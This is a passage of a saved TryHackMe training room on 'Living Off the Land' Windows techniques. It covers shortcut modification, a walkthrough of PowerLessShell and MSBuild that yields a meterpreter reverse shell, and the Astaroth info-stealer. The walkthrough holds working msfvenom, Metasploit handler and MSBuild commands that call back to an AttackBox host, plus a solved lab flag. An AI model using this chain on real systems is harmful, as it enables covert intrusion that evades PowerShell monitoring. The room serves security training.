style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">where attackers abuse the Windows tools utility to obtain command executions. For more information about this technique, you may visit the <a href="https://attack.mitre.org/techniques/T1202/" target="_blank">T1202</a> ATT&amp;CK website.</span></p><div style="text-align:center"><img src="./TryHackMe _ Living Off the Land_files/b0468b54d6174a620d130adb1edacc1c.png" style="width:684.283px;height:388.75px"></div><p></p><p><span style="text-align:center"><span>Note that you need to enable and install the Windows Subsystem for <a class="uRL8oyOP glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;uRL8oyOP&#39;)">Linux</a> in Windows 10 to use the&nbsp;</span></span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">bash.exe</span><span style="font-size:1rem">&nbsp;</span><span style="text-align:center"><span>binary. Also, the attached <a class="n8pCxwOw glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;n8pCxwOw&#39;)">VM</a> does not have the Linux Subsystem enabled due to nested virtualization restrictions.&nbsp;</span></span></p>
<p></p><p style="text-align:left">Keep in mind that this section highlighted a couple of interesting tools. If you are interested in checking out the LOLBAS tools available, you may visit the <a href="https://lolbas-project.github.io/" target="_blank">project website</a>.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p><span>For more information about bypassing Windows security controls, we suggest checking the THM room: Bypassing <a class="jlDOCVxS glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;jlDOCVxS&#39;)">UAC</a> and Applocker once released!</span></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Other Techniques
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>This section highlights a couple of interesting techniques used, whether for initial access or persistence. The following techniques belong to the Living Off the Land umbrella since they can be used as part of the Windows environment utilities.</p><p><span style="font-size:18px"><span style="font-size:24px">Shortcuts</span>
</span></p><p><img src="./TryHackMe _ Living Off the Land_files/b1b3be212430f23ddaba1f82f2c2a566.png" style="width:277px;height:389.334px;float:right" class="note-float-right"></p>
<p><span style="background-color:transparent;font-size:1rem"><span>Shortcuts or symbolic links are a technique used for referring to other files or applications within the operating system. Once a user clicks on the shortcut file, the reference file or application is executed. Often, the Red team leverages this technique to gain initial access, privilege escalation, or persistence. The <a class="BlI1UCDT glossary-term" onclick="initPopOver(&#39;MITRE&#39;, &#39;BlI1UCDT&#39;)">MITRE</a> ATT&amp;CK framework calls this </span><b>Shortcut modification technique</b>&nbsp;</span><a href="https://attack.mitre.org/techniques/T1547/009/" target="_blank">T1547</a><span style="background-color:transparent;font-size:1rem">, where an attacker creates or modifies a shortcut in order to take advantage of this technique.</span></p><p style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">To use the shortcut modification technique, we can set the target section to execute files using:</span></p><ul style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt"><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Rundll32</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Powershell</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Regsvr32</span></li><li style="background:transparent;margin-top:0pt;margin-bottom:0pt;list-style-type:disc"><span style="background:transparent;margin-top:0pt;margin-bottom:0pt">Executable on disk</span></li></ul><p></p>

<p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">The attached figure shows an example of a shortcut modification technique, where the attacker modified the Excel target section to execute a binary using&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">rundll32.exe</span>. We choose to execute a calculator instead of running the Excel application. Once the victim clicks on the Excel shortcut icon, the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">calc.exe</span><span style="color:rgb(33, 37, 41);font-size:1rem">&nbsp;</span>is executed. For more information about shortcut modification, you may check&nbsp;</span><a target="_blank" href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md" class="editor-rtfLink">this</a><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">&nbsp;GitHub repo.</span></p><p><span style="font-size:24px"><span>No <a class="VZGRyCJB glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;VZGRyCJB&#39;)">PowerShell</a>!</span></span></p><p><span>In 2019, Red Canary published a threat detection report stating that <a class="71OJhVRA glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;71OJhVRA&#39;)">PowerShell</a> is the most used technique for malicious activities. Therefore, Organizations started to monitor or block&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">powershell.exe</span><span style="font-size:1rem">&nbsp;</span><span>from being executed. As a result, adversaries find other ways to run <a class="3SWyVg8M glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;3SWyVg8M&#39;)">PowerShell</a> code without spawning it.</span><img src="./TryHackMe _ Living Off the Land_files/239e633cdb273be86d1077949539cb38.png" style="float:right;width:381px;height:138.545px" class="note-float-right"></p><p></p><p><span>PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the <a class="A1d6L0L0 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;A1d6L0L0&#39;)">PowerShell</a> process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.</span></p><p>First, let's download a copy of the project from the GitHub repo onto the AttackBox:</p><p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git</span></span></code>
	    </pre></div></div>
<p></p><p><span>One of the project requirements is to get a <a class="L1STtIBh glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;L1STtIBh&#39;)">PowerShell</a> payload to make it suitable to work with MSBuild. On the AttackBox, we need to generate a&nbsp;</span><span style="font-size:1rem">PowerShell&nbsp;</span><span style="font-size:1rem">payload using&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">msfvenom</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">as follows:&nbsp;</span></p><p></p><p style="box-sizing:border-box;margin-top:0px;margin-bottom:1rem;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial"></p><p></p><div class="terminal-container" style="box-sizing:border-box;color:rgb(33, 37, 41);font-family:Ubuntu, monospace;font-size:16px;font-style:normal;font-variant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacing:normal;orphans:2;text-align:left;text-indent:0px;text-transform:none;white-space:normal;widows:2;word-spacing:0px;-webkit-text-stroke-width:0px;background-color:rgb(255, 255, 255);text-decoration-thickness:initial;text-decoration-style:initial;text-decoration-color:initial">
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/meterpreter/reverse_winhttps <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>AttackBox_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4443</span> -f psh-reflection <span class="token operator">&gt;</span> liv0ff.ps1</span></span></code>	    </pre></div></div>
<p></p>
<p>Also, we need to run the Metasploit framework to listen and wait for the reverse shell.</p>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfconsole -q -x <span class="token string">"use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"</span></span></span>
<span class="token output">[*] Using configured payload generic/shell_reverse_tcp
payload =&gt; windows/meterpreter/reverse_winhttps
lhost =&gt; AttackBox_IP lport =&gt; 4443
[*] Started HTTPS reverse handler on https://AttackBox_IP:4443</span></code>	    </pre></div></div>
<p></p>

<p>Now that we have the payload ready, change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool. Then run the PowerLessShell tool and set the source file to the one we created with msfvenom as follows:</p>

<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Terminal</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@machine</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj</span></span></code>	    </pre></div></div>
<p></p>
<p>Once the command is executed successfully, we need to transfer the output file to the Windows machine. You can do this using the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">SCP</span><span style="font-size:1rem">&nbsp;</span>command or set a web server to host the file on the AttackBox (<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">python3 -m http.server 1337</span>) and download the file using the browser.</p><p>Finally, on the target Windows machine, build the&nbsp;<span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">.csproj</span><span style="font-size:1rem">&nbsp;</span>file and wait for the reverse shell!</p></div>
<p>
</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Command Prompt!</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           
			<code class=" language-shell-session"><span class="token output">C:\Users\thm&gt; c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj</span></code>
	    </pre></div></div>
<p></p>
<p>Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell.<span style="font-size:1rem">&nbsp;Note that</span><span style="font-size:1rem">&nbsp;there will be no&nbsp;</span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">powershell.exe</span><span style="font-size:1rem">&nbsp;process is running.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details"><span>
                                Replicate the steps of the No PowerShell technique to receive a reverse shell on port </span><span class="notion-enable-hover" style="font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em">4444</span>. Once a connection is established, a flag will be created automatically on the desktop. <b>What is the content of the flag file?</b>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************************}" value="THM{23005dc4369a0eef728aa39ff8cc3be2}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-dorange faded btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Real-life Scenario
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p></p><p>This task introduces a showcase of malware that used the techniques discussed in this room.</p><p style="text-align:center"></p><p>In 2017, The Windows Defender Advanced Threat Protection (<a href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/" target="_blank">Windows Defender ATP</a>) Research Team discovered Fileless malware named <b>Astaroth</b>. A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device's memory.<img src="./TryHackMe _ Living Off the Land_files/312a048b77af0ef89fab949cd9b753b4.png" style="width:50%;float:right" class="note-float-right" alt=" "></p><p><b>Astaroth </b>is known as an<b> information stealer</b>, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker.&nbsp;<span style="font-size:1rem">The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries to perform different functions.&nbsp;</span></p><p>In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files.&nbsp;<span style="font-size:1rem">The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following:</span></p><ul><li>A <b>WMIC</b> command is executed to download and run Javascript code.</li><li>Abusing the <b>BITSadmin </b><span>to download multiple binaries from the command and control server. Interestingly, in some cases, the malware uses YouTube channel descriptions to hide their <a class="SiceuY76 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;SiceuY76&#39;)">C2</a> server commands.</span></li><li>Using the&nbsp;<span style="font-weight:bolder">BITSadmin</span>, ADS technique, to hide their binaries within the system for their persistence.</li><li>A <b>Certutil&nbsp;</b><span>tool is used to decode a couple of downloaded payloads into <a class="ZnGAaacv glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;ZnGAaacv&#39;)">DLL</a> files.</span></li><li><span>The <a class="GulDvp96 glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;GulDvp96&#39;)">DLL</a> files are executed using </span><b>Regsvr32</b>.</li></ul><p>For more details about the malware and the detections, we suggest checking the following references:</p><ol><li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/" target="_blank">Astaroth: Banking Trojan</a></li><li><a href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer" target="_blank">Microsoft Discovers Fileless Malware Campaign Dropping Astaroth Info Stealer</a></li><li><a href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/" target="_blank">Astaroth malware hides command servers in YouTube channel descriptions</a><br></li></ol></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the above!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-9">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse9">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 9                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse9" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">In this room, we covered the general concept of </span><strong>Living Off the Land&nbsp;</strong><span style="color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt">as well as went through some of the examples seen and used during red team engagements. The Living Off the Land techniques can be used for various purposes, including reconnaissance, file operations, execution binaries, and persistence and bypass security measures.&nbsp;</span></p><p><b>Additional resources</b></p><ul><li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a><span>&nbsp;- The <a class="wWzR6Uzz glossary-term" onclick="initPopOver(&#39;Linux&#39;, &#39;wWzR6Uzz&#39;)">Linux</a> version of the LOLBAS project.</span></li><li><a href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/" target="_blank">Astaroth: Banking Trojan</a>&nbsp;- A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.</li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Good work and keep learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="9">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Living Off the Land_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 5423 users are in here and this room is 460 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Living Off the Land_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Living Off the Land_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="gmziF7tK-o7wOw_HwrumDVR9uwSHNQjsYs-A">
<input type="hidden" name="roomCode" value="livingofftheland">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Living Off the Land_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
